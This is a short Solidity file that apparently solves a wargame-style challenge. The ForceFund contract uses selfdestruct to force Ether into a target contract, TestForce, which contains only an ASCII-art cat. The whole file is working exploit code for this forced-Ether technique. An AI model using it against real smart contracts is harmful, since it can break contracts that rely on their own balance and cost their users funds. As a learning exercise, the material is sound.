// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.6.0;

contract ForceFund {
    address payable public poorContract;
    
    // Send some Ether when initiating the contract
    constructor(address payable _poorContract) public payable {
        poorContract = _poorContract;
    }
    
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
    
    // Calling selfdestruct will send this contract's balance selfdestruct's adress param
    function sacrifice() public {
        selfdestruct(poorContract);
    }
}

contract TestForce {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}